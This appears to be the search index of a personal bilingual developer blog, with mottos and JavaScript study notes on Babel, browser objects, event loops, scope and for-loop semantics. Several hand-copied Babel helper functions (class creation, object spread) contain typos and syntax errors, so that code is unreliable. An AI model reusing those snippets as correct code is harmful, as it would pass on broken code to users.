{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Index","text":""},{"location":"#_1","title":"\u6b22\u8fce\u6765\u5230 \u6211\u7684\u535a\u5ba2\uff01","text":"<p><code>Ideas Worth Sharing</code>  \u8fd9\u91cc\u4e3b\u8981\u8bb0\u5f55\u6211\u5728\u5199\u9879\u76ee\u4e2d\u7684\u5b66\u4e60\u548c\u601d\u8003</p> <ul> <li> the issue turn up frequently when people start using typescript.</li> <li> battle-proved best practice</li> </ul> <p>You can follow for updates and don't forget to \u2b50 on GitHub</p> <p>\u60a8\u53ef\u4ee5\u5173\u6ce8\u66f4\u65b0\uff0c\u4e0d\u8981\u5fd8\u8bb0\u5728 GitHub \u4e0a\u70b9\u4eae\u2b50\ufe0f</p> <p>philosophy in action</p> <ul> <li> look up as you go</li> <li> workaround, however you get there(\u6b8a\u9014\u540c\u5f52)</li> <li> \u62d2\u7edd\u95ed\u95e8\u9020\u8f66, willingness to learn</li> <li> \u201cI hear and I forget.I see and I remember.I build and I understand.\u201d</li> <li> \u98de\u673a\u4e0a\u6709 300 \u5757\u7816\u5934\uff0c\u6389\u4e0b\u6765\u4e00\u5757\u8fd8\u6709\u51e0\u5757\uff1f\u7b54\uff1a299 \u5757\uff0c \u628a\u5927\u8c61\u88c5\u8fdb\u51b0\u7bb1\u9700\u8981\u51e0\u6b65\uff1f\u7b54\uff1a\u4e09\u6b65\uff0c\u628a\u51b0\u7bb1\u95e8\u6253\u5f00\uff0c\u5927\u8c61\u585e\u8fdb\u53bb\uff0c\u5173\u4e0a\u51b0\u7bb1\u95e8\u3002 \u628a\u957f\u9888\u9e7f\u653e\u8fdb\u51b0\u7bb1\u9700\u8981\u51e0\u6b65\uff1f\u7b54\uff1a\u56db\u6b65\uff0c\u628a\u51b0\u7bb1\u95e8\u6253\u5f00\uff0c\u628a\u5927\u8c61\u62ff\u51fa\u6765\uff0c\u628a\u957f\u9888\u9e7f\u585e\u8fdb\u53bb\uff0c\u628a\u51b0\u7bb1\u95e8\u5173\u4e0a\u3002 \u68ee\u6797\u91cc\u5f00\u5927\u4f1a\u8c01\u6ca1\u53bb\uff1f\u7b54\uff1a\u957f\u9888\u9e7f\u6ca1\u53bb\uff0c\u5b83\u5728\u51b0\u7bb1\u91cc\u3002 \u4e00\u4e2a\u4eba\u8fc7\u9cc4\u9c7c\u6e56\u4e3a\u4ec0\u4e48\u6ca1\u6709\u88ab\u9cc4\u9c7c\u5403\u6389\uff1f\u7b54\uff1a\u56e0\u4e3a\u5b83\u4eec\u53bb\u68ee\u6797\u91cc\u5f00\u4f1a\u53bb\u4e86\u3002 \u90a3\u4e3a\u4ec0\u4e48\u90a3\u4e2a\u4eba\u8fd8\u662f\u6b7b\u4e86\uff1f\u7b54\uff1a\u4ed6\u662f\u88ab\u98de\u673a\u4e0a\u7684\u90a3\u5757\u7816\u7838\u6b7b\u7684</li> <li> \u7cfb\u7edf\u800c\u4e0d\u662f\u788e\u7247 step chain/ workflow/ data pipeline</li> <li> you could never fully know ahead the whole picture</li> <li> experience the problem, you can understand the solution</li> <li> dive and conquer \uff08\u5206\u800c\u6cbb\u4e4b\uff09</li> <li> feedback loop, shift the paradigameu</li> </ul> <p>\u672c\u535a\u5ba2\u642d\u5efa\u53d7 OI Wiki \u7684\u542f\u53d1,\u5728\u6b64\u81f4\u8c22\u3002</p>"},{"location":"awesome-blog/","title":"awesome blog","text":"<p>trustworthy</p> <ul> <li> vivo \u4e92\u8054\u7f51\u6280\u672f</li> </ul> <p>\u4fdd\u5b88\u70b9\uff0c90%\u7684\u7a0b\u5e8f\u5458\u4e0d\u9002\u5408\u505a\u72ec\u7acb\u5f00\u53d1</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5c31\u6211\u4ea4\u6d41\u8fc7\u7684\uff0c\u6216\u8005\u4eb2\u81ea\u5e26\u51fa\u6765\u7684\u8dd1\u901a\u53d8\u73b0\u95ed\u73af\u7684\u7a0b\u5e8f\u5458\u4e2d\uff0c\u5f88\u591a\u4eba\u6709\u7f16\u7a0b\u4e4b\u5916\u7684\u5929\u8d4b\uff0c\u53ea\u662f\u4ed6\u4eec\u6ca1\u6709\u610f\u8bc6\u5230\u7f62\u4e86\u3002</p> <p>\u4e3e\u51e0\u4e2a\u975e\u5e38\u5389\u5bb3\u7684\u80fd\u529b\uff08\u6216\u8005\u8bf4\u5929\u8d4b\uff09\uff1a</p> <ol> <li>\u5411\u4e0a\u7a81\u7834\u7684\u80fd\u529b</li> </ol> <p>\u6709\u4e00\u7c7b\u540c\u5b66\u6562\u4e8e\u628a\u81ea\u5df1\u653e\u5230\u5f53\u524d\u53ef\u80fd\u8fd8\u4e0d\u80dc\u4efb\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u901a\u8fc7\u4e0d\u65ad\u5b66\u4e60\u8ba9\u81ea\u5df1\u5b8c\u6210\u6311\u6218\u3002\u4e3e\u51e0\u4e2a\u4f8b\u5b50\uff1a</p> <ul> <li>\u5728\u4e0d\u61c2\u5730\u63a8\u7684\u65f6\u5019\uff0c\u53c2\u4e0e\u5230\u6821\u56ed\u5916\u5356\u56e2\u961f\u505a\u5730\u63a8\uff0c\u5b66\u4e60\u5e02\u573a\u548c\u63a8\u5e7f\u7684\u77e5\u8bc6</li> <li>\u5728\u53ea\u770b\u4e86\u4e00\u672c<code>HTML</code>\u4e66\u7684\u60c5\u51b5\u4e0b\uff0c\u6562\u76f4\u63a5\u63a5\u4e0b\u5b66\u6821\u5efa\u8bbe\u56fd\u9645\u4f1a\u8bae\u7f51\u7ad9\u7684\u4efb\u52a1</li> <li>\u5728\u4e0d\u61c2\u505a\u8fd0\u8425\u7684\u65f6\u5019\uff0c\u6709\u8001\u677f\u627e\u4ed6\u5f53\u516c\u53f8\u8fd0\u8425\u8d1f\u8d23\u4eba\uff0c\u4ed6\u4e5f\u63a5\u4e0b\u6765\uff0c\u5e76\u4e5f\u505a\u5f97\u5f88\u597d</li> </ul> <p>\u8fd9\u7c7b\u540c\u5b66\u5f88\u5bb9\u6613\u8dd1\u51fa\u6709\u81ea\u5df1\u7279\u8272\u7684\u975e\u6807\u670d\u52a1\uff0c\u518d\u5305\u88c5\u6210\u4ea7\u54c1\u552e\u5356\u3002</p> <ol> <li>\u6e90\u6e90\u4e0d\u65ad\u7684\u5fc3\u529b\u652f\u6301</li> </ol> <p>\u6709\u4f4d\u540c\u5b66\u770b\u77ed\u89c6\u9891\u8d8b\u52bf\u4e0d\u9519\uff0c\u6b63\u597d\u5927\u5b66\u4e5f\u73a9\u8fc7\u4e00\u6bb5\u65f6\u95f4\u5355\u53cd\uff0c\u5c31\u4e70\u4e86\u4e00\u5957\u4e13\u4e1a\u7684\u5f71\u89c6\u8bbe\u5907\uff0c\u51c6\u5907\u4e00\u8fb9\u5b66\u505a\u996d\u4e00\u8fb9\u62cd\u77ed\u89c6\u9891\uff0c\u60f3\u505a\u4e00\u540d\u7f8e\u98df\u535a\u4e3b\u3002</p> <p>\u6bcf\u5929\u4e0b\u73ed\u62cd\u89c6\u9891\u3001\u526a\u8f91\u52a0\u540e\u671f\u7684\uff0c\u6bcf\u4e2a\u89c6\u9891\u90fd\u9700\u8981\u82b1 10+ \u4e2a\u5c0f\u65f6\u3002\u71ac\u4e86\u534a\u5e74\u591a\uff0c\u6570\u636e\u4e00\u76f4\u4e0d\u884c\uff0c\u5c31\u653e\u5f03\u4e86\u3002</p> <p>\u867d\u7136\u4ed6\u5931\u8d25\u4e86\uff0c\u4f46\u5f88\u5c11\u6709\u4eba\u80fd\u5728\u6ca1\u6709\u6b63\u53cd\u9988\u7684\u4e8b\u4e0a\u575a\u6301\u534a\u5e74\uff0c\u8fd9\u79cd\u6e90\u6e90\u4e0d\u65ad\u7684\u5fc3\u529b\u652f\u6301\u5176\u5b9e\u662f\u4e00\u79cd\u5929\u8d4b\u3002</p> <p>\u9760\u8fd9\u4e2a\u5929\u8d4b\uff0c\u53ea\u8981\u8e29\u5230\u5408\u9002\u7684\u8d5b\u9053\uff0c\u6210\u529f\u662f\u8fdf\u65e9\u7684\u4e8b\u513f\u3002</p> <ol> <li>\u94fe\u63a5\u4eba\u7684\u80fd\u529b</li> </ol> <p>\u6709\u4e9b\u540c\u5b66\u7279\u522b\u559c\u6b22\u5728\u7fa4\u91cc\u5520\u55d1\uff0c\u4e0e\u5927\u4f6c\u804a\u5929\u4e5f\u4e0d\u72af\u6035\u3002\u8fd9\u5c31\u662f\u94fe\u63a5\u4eba\u7684\u5929\u8d4b\u3002</p> <p>\u5728\u5982\u4eca\u7684\u65f6\u4ee3\uff0c\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u901a\u5e38\u662f\u5728\u5c0f\u5708\u5b50\u4e2d\u4f20\u64ad\uff0c\u518d\u6162\u6162\u7834\u5708\u5230\u5927\u4f17\u89c6\u91ce\u4e2d\u3002\u8fd9\u7c7b\u540c\u5b66\u9760\u94fe\u63a5\u4eba\u7684\u5929\u8d4b\uff0c\u53ef\u4ee5\uff1a</p> <ol> <li>\u4ece\u5c0f\u5708\u5b50\u83b7\u5f97\u6709\u4ef7\u503c\u7684\u4fe1\u606f\uff0c\u505a\u4fe1\u606f\u5dee\u751f\u610f</li> <li>\u505a\u4e2d\u95f4\u4eba\u6574\u5408\u8d44\u6e90</li> </ol> <p>\u5047\u8bbe\u4f60\u63a2\u5bfb\u4e00\u5708\u540e\u53d1\u73b0 \u2014\u2014 \u81ea\u5df1\u6700\u62ff\u5f97\u51fa\u624b\u7684\u5c31\u662f\u7f16\u7a0b\u80fd\u529b\uff0c\u90a3\u4f60\u7684\u5f53\u52a1\u4e4b\u6025\u4e0d\u662f\u53d1\u6398\u9700\u6c42\u3002</p> <p>\u4ee5\u54b1\u4eec\u666e\u901a\u7a0b\u5e8f\u5458\u7684<code>\u4ea7\u54c1sense</code>\uff0c\u4e5f\u5c31\u80fd\u60f3\u51fa\u7b14\u8bb0\u5e94\u7528\u3001Todo List \u5e94\u7528\u8fd9\u7c7b\u70b9\u5b50\u4e86......</p> <p>\u4f60\u9700\u8981\u505a\u7684\uff0c\u662f\u591a\u8ba4\u8bc6\u5176\u4ed6\u5708\u5b50\u7684\u4eba\uff0c\u5411\u4ed6\u4eec\u5c55\u793a\u4f60\u7684\u7f16\u7a0b\u80fd\u529b\uff0c\u5bfb\u627e\u6f5c\u5728\u7684\u9700\u6c42\u65b9\u3002</p>"},{"location":"biograph/","title":"Biograph","text":"<p> <p></p> \u76ee\u524d\u611f\u5174\u8da3\u7684\u6280\u672f\u6709  Web/\u79fb\u52a8\u5f00\u53d1(React/Vue/Nodejs/Spring/iOS/Android)   \u670d\u52a1\u5668/\u8fd0\u7ef4/\u6570\u636e\u5e93\uff08Go/Java/Python/C++/Docker\uff09   \u7b97\u6cd5/\u5927\u6570\u636e/\u4eba\u5de5\u667a\u80fd/\u673a\u5668\u4eba/AIoT\uff08MapReduce/TensorFlow/ROS/OpenCV\uff09   \u81ea\u52a8\u9a7e\u9a76/\u667a\u80fd\u7f51\u8054\u8f66/\u65b0\u80fd\u6e90\uff08V2X/AUTOSAR/OTA/CAN/FCEV\uff09  \u7f51\u7edc/\u5206\u5e03\u5f0f\u7cfb\u7edf/\u533a\u5757\u94fe\uff08HTTP3/libp2p/web3\uff09  \u97f3\u89c6\u9891/\u76f4\u64ad/VR/AR\uff08WebRTC/FFmpeg/RTMP/SRS\uff09  \u5730\u7406GIS/\u7ed8\u56fecanvasEcharts/svg/threejs3D/Cesium\u4e09\u7ef4\u5730\u7403\u548c\u5730\u56fe\u53ef\u89c6\u5316\uff08WebGL/WebGIS\uff09  \u4f4e\u4ee3\u7801/ \u4e91\u539f\u751f\u81ea\u52a8\u5316\u8fd0\u7ef4/\u4eba\u5de5\u667a\u80fd,\u65b0\u80fd\u6e90   react/servelt/vue/solidty.js   \u786c\u4ef6/\u9a71\u52a8/\u7cfb\u7edf\u8f6f\u4ef6\u5f00\u53d1\uff08\u6c47\u7f16/C\u8bed\u8a00/Linux/Drivers/KVM/Hypervisor\uff09"},{"location":"motto/","title":"Motto","text":"<p>\u96c4\u5173\u6f2b\u9053\u771f\u5982\u94c1\uff0c\u800c\u4eca\u8fc8\u6b65\u4ece\u5934\u8d8a \u201cAdapt what is useful, reject what is useless, and add what is specifically your own.\u201d - Bruce Lee \u9e1f\u968f\u9e3e\u51e4\u98de\u817e\u8fdc\uff0c\u4eba\u4f34\u8d24\u826f\u54c1\u81ea\u9ad8 \u5982\u679c\u4f60\u5bf9\u4e16\u754c\u7406\u89e3\u662f\u5bf9\u7684\uff0c\u90a3\u4e48\u4f60\u53e3\u888b\u91cc\u4f60\u4e00\u5b9a\u6709\u5f97\u5230\u4f60\u60f3\u8981\u7684 \u4e0d\u7f3a\u62b1\u6028\u7684\u4eba\uff0c\u7f3a\u89e3\u51b3\u95ee\u9898\u7684\u4eba \u6a21\u4eff\u548c\u590d\u5236\u4e0b\u6765\uff0c\u89c4\u8303\u5de5\u5177\u5e93\u7684\u6587\u6863\u548c\u6e90\u7801\u7684\u9605\u8bfb issue, souce code, specification(http2)</p> <p>GPU &gt; CPU: \u6700\u597d\u7684\u8868\u8ff0\u662f\u80fd\u5c31\u8005\u63cf\u8ff0\u60f3\u8c61\u51fa\u753b\u9762</p>"},{"location":"motto/#magic-spell","title":"magic spell","text":"<p>the above would act as if</p> <p>Use of native JavaScript modules is dependent on the import and export statements; One reason why ES6 introduced its own module format</p>"},{"location":"JS/","title":"Index","text":"<ul> <li> - [x] \u7ed8\u56fe</li> <li> \u52a8\u753b</li> <li> \u5730\u7406GIS</li> <li> drag and drop</li> <li> \u97f3\u89c6\u9891\u6d41\u5a92\u4f53</li> <li> \u5b89\u5168</li> <li> \u6027\u80fd</li> <li> <p> \u7f51\u7edc</p> </li> <li> <p> web storage( localStroage and sessionStorage)</p> </li> <li> video timed Track / Aduio data API</li> <li> IndexDB and web SQL</li> <li> web Sockets</li> <li> Geo-location</li> <li> Drag and Drop</li> <li> WebGl</li> <li> HTML5 frame Fragment Web Component</li> <li> Web API</li> </ul> Javascript engines <p>Our Javascript codes run inside a Javascript engine, on browser, our code run in <code>V8</code> or <code>webkit</code>,  on IOS,. our code runs in <code>JSC</code>,</p> <p>on Android, our code can either run in <code>JSC</code> or a new engine from Facebook called <code>Hermes</code></p> <p>Each Javascript engine, and each version of Javascript engine, suppors slightly different  Javascript language features,  The <code>JSC</code> used by IOS 12 may not support the exact same feature set as the one in IOS 13 or IOS 14, and it will almost certainly be a little different than <code>Herms</code></p> <p>We don't want to have to think about this complexity when writing an app - thats where <code>Babel</code> comes in.</p> Babel <p>Babel is a highly configurable compiler that les us use newer Javascript language features(and extensions, like JSX), compiling down into older versions of Javascript that are support on a wide range of engines. This essentially smooths out any different <code>JSC</code> version, or between <code>JSC</code> and <code>Herms</code>, so we don't have to think about those differences when writing our app.</p> <p>fetatue dection and polyfill</p> <pre><code>if(CSS.supports(\"subgrid\")){}\n</code></pre> Typescript <p>JavaScript is dynamically typed, which means the type checking  </p> <p>at runtime. This is convenient for small-scale app. but it's often helpful to have type-checking at compile time. For this reason, many .</p> <p>Typescript extends JavaScript, adding syntax for type declarations and annotation. The Typescript compiler can perform compiler-time type checking. Before transforming the Typescript code into Javascript.</p> Up next <p>Let's go thorught some a few Javascript language features, and then jump into Javascript language extesion, before moving into React</p>"},{"location":"JS/BOM/","title":"BOM","text":"<p>The Browser Object Model (BOM) in JavaScript refers to the objects provided by the browsers to interact with them</p> <ul> <li>Window \u2212 The 'window' object represents the current browser window. You can use it to manipulate the browser window.</li> <li>Document \u2212 The 'document' object represents the currently opened web page in the browser window. You can use it to customize the property of the document.</li> <li>Screen \u2212 It provides information about the user's device's screen.</li> <li>History \u2212 It provides the browser's session history.</li> <li>Navigator \u2212 It is used to get the browser's information like default language, etc.</li> <li>Location \u2212 The Location object is used to get the URL information, such as the hostname of the current web page.</li> <li>Console \u2212 The console object allows developers to access the browser's console.</li> </ul>"},{"location":"JS/DOM/","title":"DOM","text":""},{"location":"JS/DOM/#dom-hierarchy","title":"DOM hierarchy","text":""},{"location":"JS/async/","title":"\u5f02\u6b65\u7f16\u7a0b","text":"<ul> <li>promise</li> <li>stream</li> <li>event emitter</li> <li>observable</li> <li>child process</li> </ul>"},{"location":"JS/async/#_1","title":"\u5f02\u6b65\u4e1a\u52a1\u573a\u666f","text":"<ul> <li>\u7f51\u7edc\u8bf7\u6c42</li> <li>\u5b9a\u65f6\u4efb\u52a1 (\u9a8c\u8bc1\u7801countdown, toast timeelapsed fade, request timeout cancel)</li> <li>\u4e8b\u4ef6\u7ed1\u5b9a</li> <li>\u5927\u6570\u636e\u5904\u7406 web worker</li> </ul>"},{"location":"JS/async/#_2","title":"\u5904\u7406\u7b56\u7565","text":"<ul> <li> <p>\u56de\u8c03\u51fd\u6570</p> </li> <li> <p>promise</p> </li> <li> <p>async/await</p> </li> <li> <p>\u5206\u53d1\u8ba2\u9605\u6a21\u5f0f</p> <p>once(eventName,cb) {   const one = (...args) =&gt; {     cb(...args)     this.off(eventName,one)   }</p> <p>this.on(eventName, one) }   }   ```</p> </li> <li> <p>generator \u51fd\u6570</p> </li> <li> <p>promise.all</p> </li> <li> <p>\u9884\u52a0\u8f7d\u8d44\u6e90</p> </li> </ul>"},{"location":"JS/builtin/","title":"Builtin","text":""},{"location":"JS/builtin/#property-flag-and-descriptors","title":"property flag and descriptors","text":""},{"location":"JS/builtin/#property-flags","title":"property flags","text":"<p><code>writable</code> \u2013 if true, the value can be changed, otherwise it\u2019s read-only. <code>enumerable</code> \u2013 if true, then listed in loops, otherwise not listed. <code>configurable</code> \u2013 if true, the property can be deleted and these attributes can be modified, otherwise not.</p>"},{"location":"JS/builtin/#to-get-those-flag","title":"To get those flag","text":"<p><code>Object.getownPropertyDescriptor(o, propName)</code></p>"},{"location":"JS/builtin/#to-change-the-flags","title":"To change the flags","text":"<p><code>Object.defineProperty(obj, propertyName, descriptor)</code> <pre><code>Object.defineProperty(user, \"toString\", {\n  enumerable: false\n});\n\nfor (let key in user) {}\nObject.keys(user).forEach()\n</code></pre></p>"},{"location":"JS/builtin/#objectfreeze","title":"Object.freeze()","text":"<p>new properties cannot be added, existing properties cannot be removed or value cannot be changed, and the object's prototype cannot be re-assigned</p>"},{"location":"JS/builtin/#proxy-and-reflect","title":"proxy and reflect","text":""},{"location":"JS/builtin/#map-and-set","title":"map and set","text":""},{"location":"JS/control-flow/","title":"Control flow","text":""},{"location":"JS/control-flow/#for-statement","title":"for statement","text":"<p>used for control flow for(   initation;    condition;    afterthought   )   block statement;   {}</p>"},{"location":"JS/control-flow/#execution-order","title":"execution order","text":"<p>initation-&gt;condition-&gt;block statement-&gt;afterthought</p>"},{"location":"JS/control-flow/#initialization","title":"initialization","text":"<ol> <li>initialization variable get declared and assign value fitst time.</li> <li>declared while assing value</li> <li>assign value after delcaring variable</li> <li>unitialization variable get declared but did not assign value yet.</li> </ol> declar with vardeclar with let <pre><code>  for (var i = 0; i&lt;3; i++){\n    console.log(i)\n    }\n  console.log(i)\n</code></pre> <pre><code>  for (var i = 0; i&lt;3; i++){\n  console.log(i)\n  }\n  console.log(i)\n</code></pre>"},{"location":"JS/control-flow/#condition","title":"condition","text":"<p>conditon =&gt; false =&gt; exit loop, goto the first statement/expression after for   empty expression =&gt; false  condition =&gt; ture =&gt; enter loop</p>"},{"location":"JS/control-flow/#afterthough","title":"afterthough","text":"<p>An expression to be evaluated at the end of each loop iteration    occurs before the next evaluation of condition</p>"},{"location":"JS/control-flow/#lexical-scope","title":"lexical scope","text":"<p>for with web api</p> <pre><code>  for(var i = 0; i &lt; 3; i++) {\n    setTimeout(() =&gt; {\n      console.log(i)\n    },500)\n  }\n</code></pre> <pre><code>  const marcoTaskQueue = [\n    () =&gt; {console.log(i)}, //500\n    () =&gt; {console.log(i)}, //1000\n    () =&gt; {console.log(i)}, //1500\n  ]\n\n  const callstack = [\n    () =&gt; {console.log(i)},\n    console.log(i) // variable binding lookup to 3\n  ]\n</code></pre> <p>for statement with let variable declared let declarations are special-cased by for loops  if initialization is a let declaration, A new lexical scope is created for every loop The binding values from the last iteration are used to re-initialize the new variables. afterthought is evaluated in the new scope.</p> <p><pre><code>const arr = []\n  for(let i = 0; i &lt; 3; i++ ){\n    const fn = () =&gt; {\n      console.log(i)\n    }\n    arr.push(fn)\n  } \n\n  arr.forEach(fn =&gt; fn())\n</code></pre> equivalent to</p> <pre><code>const arr = [];\nlet initialStep = 0,\n  lastStep = initialStep;\n\n{\n  let i = lastStep; //0\n  const fn = () =&gt; {\n    console.log(i);\n  };\n  arr.push(fn);\n  lastStep++;\n}\n{\n  let i = lastStep; //1\n  const fn = () =&gt; {\n    console.log(i);\n  };\n  arr.push(fn);\n  lastStep++;\n}\narr.forEach((fn) =&gt; fn());\n</code></pre>"},{"location":"JS/error-handling/","title":"Error handling","text":"<ul> <li>ReferenceError \u2212 Trying to access an undefined variable/ method.</li> <li>TypeError \u2212 Attempting an operation on incompatible data types.</li> <li>RangeError \u2212 A value exceeds the allowed range.</li> </ul>"},{"location":"JS/es6%2B/","title":"es6+","text":"<ul> <li>spider monkey team</li> <li>v8 team</li> <li>webkit team</li> </ul>"},{"location":"JS/es6%2B/#es6-new-features-in-javascript","title":"es6+, new features in Javascript","text":"<ul> <li> imports and exports</li> <li> Arrow functions</li> <li> Classes</li> <li> Destrcturing</li> <li> Spread</li> <li> Async/ await</li> </ul>"},{"location":"JS/es6%2B/#class","title":"class","text":"<pre><code>function _defineProperties(target, props){\n    for(var i = 0; i &lt; props.length; i++){\n    var descriptor = props[i]\n    descriptor.enumerable = descriptor.enumerable || false;\n    descriptor.configurable = true;\n    if(value in descriptor) descriptor.writable = true;\n    Object.defineProperty(target, _toPropertyKey(descriptor.key), descriptor)\n  }\n}\n\nfunction _toPrimitive(input, hint){\n    if(typeof input !== 'obejct' || input === null ) return input\n  var prim = input[Symbolo.toPrimitive]\n  if(prim!==undefined){\n    var res = prim.call(input, hint || \"default\")\n    if(typeof res !== 'object') return res\n    throw new TypeError(\"@@toPrimitive must return a primitive value\")\n   }\n  return (hint === 'string' ? String : Number)(input)\n}\n\nfunction _toPropertyKey(arg){\n  var key = _toPrimitive(arg, \"string\")\n  return typeof key === 'symbol' : key : String(key)\n}\n\n\n\nfunction _createClass(Constructor, protoProps, staticProps){\n    protoProps &amp;&amp; _defineProperties(Constructor.prototype, protoProps);\n  staticProps &amp;&amp;  _defineProperties(Constructor, staticProps)\n  Object.defineProperty(Constructor, \"prototype\", {writable: false})\n  return Constructor\n}\n\nfunction _classCallCheck(instance, Constructor){\n  if(!(instance instanceof Constructor)){\n    throw new TypeError(\"Cannot call a class as a function\")\n  }\n}\n\nvar Person = /*#__Pure__#*/ _createClass(function Person(){\n    _classCallCheck(this, Person)\n})\n</code></pre> <p>gist</p> <pre><code>const saferHTML = str =&gt;\n    return str.replace(/&amp;/g, \"&amp;amp;\")\n                        .replace(/&lt;/g, \"&amp;lt;\")\n                        .replace(/&gt;/g, \"&amp;gt;\")\n</code></pre>"},{"location":"JS/es6%2B/#_1","title":"\u6a21\u7248\u5b57\u7b26\u4e32","text":"<p>expression</p> <ul> <li>member expression</li> <li>call expression</li> <li>name</li> <li>literal:</li> <li>object literal: <code>[]</code> <code>{}</code></li> <li>pattern literal: <code>/pattern/</code></li> <li>number literal: <code>0</code> <code>0x0</code> <code>0b0</code></li> <li>string literal: <code>''</code></li> <li>jsx</li> </ul>"},{"location":"JS/es6%2B/#_2","title":"\u5bf9\u8c61\u5c55\u5f00","text":"<pre><code>function ownKeys(object, enumerableOnly){\n  // Object.keys() returns an array whose elements are strings corresponding to the enumerable string-keyed property names found directly upon object.\n  var keys = Object.keys(object)\n\n  if(Object.getOwnPropertySymbols){\n    // get all symbol properties of a given object as an array of symbols\n    var symbols = Object.getOwnPropertySymbols(object)\n    if(enumerableOnly){\n      symbols = symbols.filter(function(sym){\n        return Object.getOwnPropertyDescriptor(object, sym).enumerable\n      })\n    }\n    keys.push.apply(keys,symbols)\n  }\n  return keys\n}\n\n\n\nfunction _objectSpread(target){\n    for(var i = 1; i &lt; arguments.length; i++){\n    var source = null != arguments[i] ? arguments[i] : {}\n  if (i % 2) {\n    ownKeys(Object(source), true).forEach(function(key){\n      _defineProperty(target, key, source[key])\n    })\n  } else if (Object.getOwnPropertyDescriptors){\n    Object.definePorperties(target, Object.getOwnPropertyDescriptors(source))\n  } else {\n    ownKeys(Object(source).forEach(function(key){\n      Object.defineProperty(\n        target,\n        key,\n        Object.getOwnPropertyDescriptor(source,key)\n      )\n    }))\n  }\n  return target;\n\n}\n}\n\nfunction _defineProperty(obj, key, value){\n  if (key in obj) {\n    Object.defineProperty(obj, key, {\n      vlaue: value,\n      enumerable: true,\n      configurable: true,\n      writable: true\n    }) else {\n      obj[key] = value\n    }\n  }\n  return obj\n}\n\n\nvar a = {\n  a: 1\n};\nvar b = {\n  b: 2\n};\n\n\nvar c = _objectSpread(_objectSpread({},a), b)\n</code></pre>"},{"location":"JS/es6%2B/#array-polyfill","title":"Array polyfill","text":"<pre><code>function includes\nindexof\nlastIndexof\npop\nshift\npush\nunshift\nsplice\n</code></pre>"},{"location":"JS/es6%2B/#array-utility","title":"Array utility","text":"<p>underscore</p> <p>loadash(https://lodash.com/docs/4.17.15#compact)</p>"},{"location":"JS/es6%2B/#_3","title":"\u7f16\u8bd1\u5de5\u5177","text":"<ul> <li>babel</li> <li>esbuild</li> <li> <p>swc</p> </li> <li> <p>rollup</p> </li> </ul>"},{"location":"JS/es6%2B/#_4","title":"\u6253\u5305\u5de5\u5177","text":"<ul> <li>webpack</li> <li>vite</li> </ul>"},{"location":"JS/event/","title":"event model","text":"<pre><code>                 | |  / \\\n-----------------| |--| |-----------------\n| element1       | |  | |                |\n|   -------------| |--| |-----------     |\n|   |element2    \\ /  | |          |     |\n|   --------------------------------     |\n|        W3C event model                 |\n------------------------------------------\n</code></pre> <pre><code>addEventListener(\n  type, \n  listener, \n  useCapture // default to false\n)\n</code></pre> <pre><code>addEventListener(\n  type, \n  listener, \n  options\n)\n\notpions = {\n    capture: false,\n  once: false\n  singal: \n}\n</code></pre> <ul> <li>event delegation</li> <li>event bubbling</li> <li>event capturing</li> <li>custom events</li> </ul> <p>bubble</p> <ul> <li> <p>target is the element that triggered the event (e.g., the user clicked on)</p> </li> <li> <p>currentTarget is the element that the event listener is attached to.</p> </li> </ul>"},{"location":"JS/event_loop/","title":"\u4e8b\u4ef6\u5faa\u73af","text":""},{"location":"JS/event_loop/#_1","title":"\u6d4f\u89c8\u5668\u4e8b\u4ef6\u5faa\u73af","text":""},{"location":"JS/event_loop/#_2","title":"\u5b8f\u4efb\u52a1","text":"<ul> <li>I/O</li> <li>setTimeout</li> <li>setInterval</li> <li>setImmediate</li> <li>requestAnimationFrame</li> </ul>"},{"location":"JS/event_loop/#_3","title":"\u5fae\u4efb\u52a1","text":"<p>\u5f53<code>\u5b8f\u4efb\u52a1</code>\u6267\u884c\u5b8c\uff0c\u4f1a\u5728\u6e32\u67d3\u524d\uff0c\u5c06\u6267\u884c\u671f\u95f4\u6240\u4ea7\u751f\u7684\u6240\u6709<code>\u5fae\u4efb\u52a1</code>\u90fd\u6267\u884c\u5b8c</p> <ul> <li>process.nextTick</li> <li>MutationObserver</li> <li>Promise.then catch finally</li> </ul>"},{"location":"JS/execution_context/","title":"JS\u662f\u5982\u4f55\u6267\u884c\u7684","text":""},{"location":"JS/execution_context/#_1","title":"\u8bcd\u6cd5\u4f5c\u7528\u57df \u52a8\u6001\u4f5c\u7528\u57df","text":"<p>\u4f5c\u7528\u57df</p> <p>scope is all about variable lookup bind value</p> <p>\u67e5\u627e\u53d8\u91cf\u7ed1\u5b9a\u7684\u503c</p> <p>\u9759\u6001\u4f5c\u7528\u57df: \u4f5c\u7528\u57df\u5728\u51fd\u6570\u58f0\u660e\u65f6\u5c31\u786e\u5b9a\u7684</p> <p>\u52a8\u6001\u4f5c\u7528\u57df: \u4f5c\u7528\u57df\u5728\u8c03\u7528\u65f6\u51b3\u5b9a\u7684</p> <p>\u4f5c\u7528\u57df\u94fe: local scope -&gt; parent scope ... -&gt; global scope</p>"},{"location":"JS/execution_context/#scope","title":"scope","text":"<p>function scope block scope module scope</p> <p>return value of inner function call</p> <pre><code>function outer(m){\n  function inner(t){\n        return m*t\n  }\n  return inner(Math.PI)\n}\n</code></pre> <p>return value of inner function reference</p> <pre><code>function outer(m){\n  function inner(t){\n    return m*t\n  }\n  return inner\n}\n</code></pre> <pre><code>const area = (r,shape_constant) =&gt; r*r*shape_constant\nconst area_square = r =&gt; area(r,1)\nconst area_circle = r =&gt; area(r,Math.PI)\nconst area_hexagon = r =&gt; area(r, 3 * Math.sqrt(3) / 2)\n</code></pre> <p>dynamic scope vs lexical scope</p> <p>scope is determined at run time: look up (name/identifier/variable)  bind  value at run-time</p> <p>context object</p> <p>dynamic scope</p> <p>scope is determined at run time: look up (name/identifier/variable)  bind  value at run-time</p> Tip <p>\u200b   \u4f5c\u7528\u57df\u672c\u8d28\u662f\u53d8\u91cf\u67e5\u627e\u673a\u5236,\u60f3\u6df1\u5165\u7406\u89e3\u63a8\u8350 berkeley cs61a</p> <ul> <li> expression type</li> </ul> <p></p> <ul> <li> call expression</li> </ul> <p></p> <ul> <li> call expression evaluation precedure</li> </ul> <p></p> <ul> <li> expression tree</li> </ul> <p></p>"},{"location":"JS/execution_context/#_2","title":"\u6267\u884c\u4e0a\u4e0b\u6587","text":"<pre><code>var foo = function(){\n  